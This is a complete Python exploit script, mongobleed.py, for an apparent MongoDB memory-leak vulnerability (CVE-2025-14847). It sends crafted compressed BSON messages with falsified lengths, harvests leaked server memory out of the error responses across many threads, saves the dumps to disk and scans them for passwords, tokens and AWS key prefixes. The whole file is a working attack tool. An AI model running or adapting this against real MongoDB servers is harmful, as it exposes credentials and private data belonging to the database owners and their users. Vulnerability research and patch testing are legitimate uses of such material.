#!/usr/bin/env python3
"""
mongobleed.py - CVE-2025-14847 MongoDB Memory Leak Exploit

Author: Joe Desimone - x.com/dez_

Exploits zlib decompression bug to leak server memory via BSON field names.
Technique: Craft BSON with inflated doc_len, server reads field names from
leaked memory until null byte.
"""

import argparse
import base64
import codecs
import concurrent.futures
import datetime
import os
import re
import socket
import struct
import zlib

from rich.console import Console
from urllib.parse import unquote_to_bytes

FIELD_NAME_RE = re.compile(rb"field name '([^']*)'")
TYPE_RE = re.compile(rb"type (\d+)")
URL_ENC_RE = re.compile(r"%[0-9A-Fa-f]{2}")
UNICODE_ESC_RE = re.compile(r"\\u[0-9A-Fa-f]{4}|\\x[0-9A-Fa-f]{2}|\\[nrt\"\\\\]")
BASE64_RE = re.compile(r"^[A-Za-z0-9+/]+={0,2}$")
SIZE_RE = re.compile(r"^\s*(\d+)\s*(kb|mb)?\s*$", re.IGNORECASE)

def send_probe(host, port, doc_len, buffer_size, timeout):
    """Send crafted BSON with inflated document length"""
    # Minimal BSON content - we lie about total length
    content = b'\x10a\x00\x01\x00\x00\x00'  # int32 a=1
    bson = struct.pack('<i', doc_len) + content
    
    # Wrap in OP_MSG
    op_msg = struct.pack('<I', 0) + b'\x00' + bson
    compressed = zlib.compress(op_msg)
    
    # OP_COMPRESSED with inflated buffer size (triggers the bug)
    payload = struct.pack('<I', 2013)  # original opcode
    payload += struct.pack('<i', buffer_size)  # claimed uncompressed size
    payload += struct.pack('B', 2)  # zlib
    payload += compressed
    
    header = struct.pack('<IIII', 16 + len(payload), 1, 0, 2012)
    
    try:
        sock = socket.socket()
        sock.settimeout(timeout)
        sock.connect((host, port))
        sock.sendall(header + payload)
        
        response = b''
        while len(response) < 4 or len(response) < struct.unpack('<I', response[:4])[0]:
            chunk = sock.recv(4096)
            if not chunk:
                break
            response += chunk
        sock.close()
        return response
    except:
        return b''

def extract_leaks(response):
    """Extract leaked data from error response"""
    if len(response) < 25:
        return []
    
    try:
        msg_len = struct.unpack('<I', response[:4])[0]
        if struct.unpack('<I', response[12:16])[0] == 2012:
            raw = zlib.decompress(response[25:msg_len])
        else:
            raw = response[16:msg_len]
    except:
        return []
    
    leaks = []
    
    # Field names from BSON errors
    for match in FIELD_NAME_RE.finditer(raw):
        data = match.group(1)
        if data and data not in [b'?', b'a', b'$db', b'ping']:
            leaks.append(data)
    
    # Type bytes from unrecognized type errors
    for match in TYPE_RE.finditer(raw):
        leaks.append(bytes([int(match.group(1)) & 0xFF]))
    
    return leaks

def main():
    examples = (
        "Examples:\n"
        "  python3 mongobleed.py --host <target>\n"
        "  python3 mongobleed.py --host <target> --min-offset 20 --max-offset 8192\n"
        "  python3 mongobleed.py --host <target> --loop\n"
        "  python3 mongobleed.py --host <target> --loop --max-empty-passes 3\n"
        "  python3 mongobleed.py --host <target> --loop --timeout 3 --workers 200\n"
        "  python3 mongobleed.py --host <target> --dump 10MB\n"
        "  python3 mongobleed.py --host <target> --dump 10MB --dump-window 2048\n"
        "  python3 mongobleed.py --host <target> --dump 512KB --preview-bytes 4096 --decode\n"
        "  python3 mongobleed.py --host <target> --min-offset 100 --max-offset 20000\n"
    )
    parser = argparse.ArgumentParser(
        description='CVE-2025-14847 MongoDB Memory Leak',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=examples,
    )
    parser.add_argument('--host', default='localhost', help='Target host')
    parser.add_argument('--port', type=int, default=27017, help='Target port')
    parser.add_argument('--min-offset', type=int, default=20, help='Min doc length')
    parser.add_argument('--max-offset', type=int, default=1048576, help='Max doc length')
    parser.add_argument('--buffer-extra', type=int, default=500, help='Extra bytes for claimed buffer size')
    parser.add_argument('--timeout', type=float, default=2.0, help='Socket timeout in seconds')
    parser.add_argument('--workers', type=int, default=max(4, (os.cpu_count() or 4) * 10), help='Thread count')
    parser.add_argument('--preview-bytes', type=int, default=80, help='Bytes to show in console preview')
    parser.add_argument('--max-empty-passes', type=int, default=1, help='Stop after N passes with no new leaks')
    parser.add_argument('--loop', action='store_true', help='Keep looping until stopped')
    parser.add_argument('--decode', action='store_true', help='Try to decode URL, unicode escapes, and base64')
    parser.add_argument('--dump', help='Target claimed size, e.g. 10MB or 512KB')
    parser.add_argument('--dump-window', type=int, default=0, help='Probe +/- N bytes around dump size')
    parser.add_argument('--output', default=None, help='Output file (default: auto-generated)')
    args = parser.parse_args()

    console = Console()

    def ascii_preview(data, limit):
        view = data[:limit]
        out = []
        for b in view:
            if 32 <= b <= 126 and b not in (92,):
                out.append(chr(b))
            elif b == 92:
                out.append(r"\\")
            elif b == 9:
                out.append(r"\t")
            elif b == 10:
                out.append(r"\n")
            elif b == 13:
                out.append(r"\r")
            else:
                out.append(f"\\x{b:02x}")
        return "".join(out)

    def truncate_text(text, limit):
        if len(text) <= limit:
            return text
        return text[:limit] + "…"

    def is_mostly_printable(text):
        if not text:
            return False
        printable = sum(1 for ch in text if ch.isprintable())
        return (printable / len(text)) >= 0.7

    def printable_ratio(text):
        if not text:
            return 0.0
        printable = sum(1 for ch in text if ch.isprintable())
        return printable / len(text)

    def render_clean_text(text):
        out = []
        for ch in text:
            code = ord(ch)
            if ch == "\\":
                out.append(r"\\")
            elif ch == "\n":
                out.append(r"\n")
            elif ch == "\r":
                out.append(r"\r")
            elif ch == "\t":
                out.append(r"\t")
            elif 32 <= code <= 126:
                out.append(ch)
            elif ch.isprintable():
                out.append(ch)
            elif code <= 0xFF:
                out.append(f"\\x{code:02x}")
            else:
                out.append(f"\\u{code:04x}")
        return "".join(out)

    def decode_variants(data, limit):
        variants = []
        ascii_text = data.decode("ascii", errors="ignore")

        if URL_ENC_RE.search(ascii_text):
            try:
                decoded_bytes = unquote_to_bytes(ascii_text)
                decoded_text = decoded_bytes.decode("utf-8", errors="replace")
                if is_mostly_printable(decoded_text):
                    variants.append("url:" + truncate_text(decoded_text, limit))
            except Exception:
                pass

        if UNICODE_ESC_RE.search(ascii_text):
            try:
                decoded_text = codecs.decode(ascii_text, "unicode_escape")
                cleaned = render_clean_text(decoded_text)
                if is_mostly_printable(cleaned):
                    variants.append("esc:" + truncate_text(cleaned, limit))
            except Exception:
                pass

        b64_candidate = ascii_text.strip()
        if len(b64_candidate) >= 12 and len(b64_candidate) % 4 == 0 and BASE64_RE.match(b64_candidate):
            try:
                decoded_bytes = base64.b64decode(b64_candidate, validate=True)
                decoded_text = decoded_bytes.decode("utf-8", errors="replace")
                if is_mostly_printable(decoded_text):
                    variants.append("b64:" + truncate_text(decoded_text, limit))
            except Exception:
                pass

        return variants

    def decode_from_preview(preview, limit):
        try:
            decoded = codecs.decode(preview, "unicode_escape")
        except Exception:
            return None
        cleaned = render_clean_text(decoded)
        if len(cleaned) > limit:
            cleaned = truncate_text(cleaned, limit)
        if printable_ratio(cleaned) > printable_ratio(preview):
            return cleaned
        return None

    def parse_size(value):
        if value is None:
            return None
        if isinstance(value, int):
            return value
        match = SIZE_RE.match(str(value))
        if not match:
            raise ValueError(f"Invalid size: {value}")
        amount = int(match.group(1))
        unit = (match.group(2) or "").lower()
        if unit == "kb":
            return amount * 1024
        if unit == "mb":
            return amount * 1024 * 1024
        return amount

    if args.dump:
        target = parse_size(args.dump)
        window = max(0, args.dump_window)
        args.min_offset = max(0, target - window)
        args.max_offset = target + window + 1
        args.buffer_extra = 0
        args.loop = False
        args.max_empty_passes = 1
        if window:
            console.print(f"[bold cyan][*][/bold cyan] Dump mode: {target} bytes (window +/- {window})")
        else:
            console.print(f"[bold cyan][*][/bold cyan] Dump mode: {target} bytes")

    if not args.output:
        ts = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
        safe_host = re.sub(r"[^A-Za-z0-9._-]+", "_", args.host)
        args.output = f"leaked_{safe_host}_{args.port}_{ts}.bin"

    console.print("[bold cyan][*][/bold cyan] mongobleed - CVE-2025-14847 MongoDB Memory Leak")
    console.print("[bold cyan][*][/bold cyan] Author: Joe Desimone - x.com/dez_")
    console.print(f"[bold cyan][*][/bold cyan] Target: {args.host}:{args.port}")
    console.print(f"[bold cyan][*][/bold cyan] Scanning offsets {args.min_offset}-{args.max_offset}")
    console.print(f"[bold cyan][*][/bold cyan] Workers: {args.workers}")
    console.print(f"[bold cyan][*][/bold cyan] Output: {args.output}")
    console.print("")
    
    unique_fragments = []
    unique_leaks = set()
    if os.path.exists(args.output):
        with open(args.output, 'rb') as f:
            all_leaked = f.read()
    else:
        all_leaked = b""
    out_fh = open(args.output, 'ab')
    
    def worker(doc_len):
        response = send_probe(
            args.host,
            args.port,
            doc_len,
            doc_len + args.buffer_extra,
            args.timeout,
        )
        return doc_len, extract_leaks(response)

    empty_passes = 0
    pass_num = 0
    while True:
        pass_num += 1
        new_in_pass = 0
        with concurrent.futures.ThreadPoolExecutor(max_workers=args.workers) as executor:
            futures = [executor.submit(worker, doc_len) for doc_len in range(args.min_offset, args.max_offset)]
            for future in concurrent.futures.as_completed(futures):
                doc_len, leaks = future.result()
                for data in leaks:
                    if data not in unique_leaks and data not in all_leaked:
                        unique_leaks.add(data)
                        unique_fragments.append(data)
                        out_fh.write(data)
                        all_leaked += data
                        new_in_pass += 1

                        # Show interesting leaks (> 10 bytes)
                        if len(data) > 10:
                            preview = ascii_preview(data, args.preview_bytes)
                            if args.decode:
                                variants = decode_variants(data, args.preview_bytes * 2)
                                if variants:
                                    preview = " | ".join(variants)
                                else:
                                    cleaned = decode_from_preview(preview, args.preview_bytes * 2)
                                    if cleaned:
                                        preview = cleaned
                            console.print(f"[green][+][/green] offset={doc_len:4d} len={len(data):4d}: {preview}")
        if args.loop:
            console.print(f"[bold cyan][*][/bold cyan] Pass {pass_num} complete, new fragments: {new_in_pass}")
            continue

        if new_in_pass == 0:
            empty_passes += 1
        else:
            empty_passes = 0
        console.print(f"[bold cyan][*][/bold cyan] Pass {pass_num} complete, new fragments: {new_in_pass}")
        if empty_passes >= args.max_empty_passes:
            break

    out_fh.close()
    console.print("")
    console.print(f"[bold cyan][*][/bold cyan] Total leaked: {len(all_leaked)} bytes")
    console.print(f"[bold cyan][*][/bold cyan] Unique fragments (this run): {len(unique_leaks)}")
    console.print(f"[bold cyan][*][/bold cyan] Saved to: {args.output}")
    
    # Show any secrets found
    secrets = [b'password', b'secret', b'key', b'token', b'admin', b'AKIA']
    for s in secrets:
        if s.lower() in all_leaked.lower():
            console.print(f"[bold red][!][/bold red] Found pattern: {s.decode()}")

if __name__ == '__main__':
    main()
